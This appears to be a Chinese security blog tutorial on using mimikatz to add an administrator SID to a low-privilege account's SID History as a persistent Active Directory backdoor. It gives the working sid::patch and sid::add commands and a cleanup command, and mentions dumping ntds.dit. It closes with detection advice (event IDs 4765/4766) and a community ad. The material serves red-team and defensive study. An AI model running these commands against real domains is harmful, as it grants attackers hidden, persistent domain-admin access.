**目录**

[SID History](#t0 "SID History")

[mimikatz添加SID History后门](#t1 "mimikatz添加SID History后门")

[SID History域后门防御措施](#t2 "SID History域后门防御措施")

* * *

SID History
-----------

每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的[访问权限](https://so.csdn.net/so/search?q=%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)。SID History是在域迁移过程中需要使用的一个属性。

如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。

### mimikatz添加SID History后门

**第一步：**打开mimikatz，将administrator的SID添加到恶意域用户 hack 的SID History属性中。需要注意的是，在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。

```
privilege::debug      
sid::patch      
sid::add /sam:hack /new:administrator     #将administrator的SID添加到hack的SID History属性中
```


![](https://img-blog.csdnimg.cn/20200218195059949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**第二部：**使用PowerShell查看test用户的SID History

```
Import-Module activedirectory      
Get-ADUser hack -Properties sidhistory
```


![](https://img-blog.csdnimg.cn/20200218195211537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**第三步：**使用域用户hack登录系统，测试其是否具有administrator用户的权限，我们这里列出域控的C盘。

![](https://img-blog.csdnimg.cn/20200218195603484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

SID History域后门防御措施
------------------

在给出具体的防御措施之前，我们分析一下SID History域后门的特点

*   在控制域控后，可以通过注入SID History属性完成持久化任务
*   拥有高权限SID 的用户，可以使用PowerShell远程导出域控制器的ntds.dit
*   如果不再需要通过SID History属性实现持久化，可以在mimikatz中执行命令“sid::clear /sam:username”，清除SID History属性。

**SID History域后门的防御措施如下：**

*   经常查看域用户中SID 为500的用户
*   完成域迁移工作后，对有相同SID History属性的用户进行检查
*   定期检查ID为4765和4766的日志。4765位将SID History属性添加到用户的日志。4766为将SID History属性添加到用户失败的日志。

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)